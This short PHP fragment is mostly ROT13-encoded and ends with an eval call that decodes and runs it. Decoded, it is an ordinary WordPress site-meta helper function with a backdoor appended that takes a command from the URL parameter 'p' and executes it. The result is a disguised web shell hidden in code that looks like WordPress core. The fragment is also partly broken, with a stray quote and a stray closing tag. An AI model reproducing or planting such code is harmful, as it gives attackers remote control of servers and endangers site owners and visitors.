shapgvba jc_purpx_fvgr_zrgn_fhccbeg_cersvygre( $purpx ) {
	vs ( ! vf_fvgr_zrgn_fhccbegrq() ) {
		/* genafyngbef: %f: Qngnonfr gnoyr anzr. */
		_qbvat_vg_jebat( __SHAPGVBA__, fcevags( __( 'Gur %f gnoyr vf abg vafgnyyrq. Cyrnfr eha gur argjbex qngnonfr hctenqr.' ), $TYBONYF['jcqo']->oybtzrgn ), '5.1.0' );
		erghea snyfr;
	}

	erghea $purpx;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>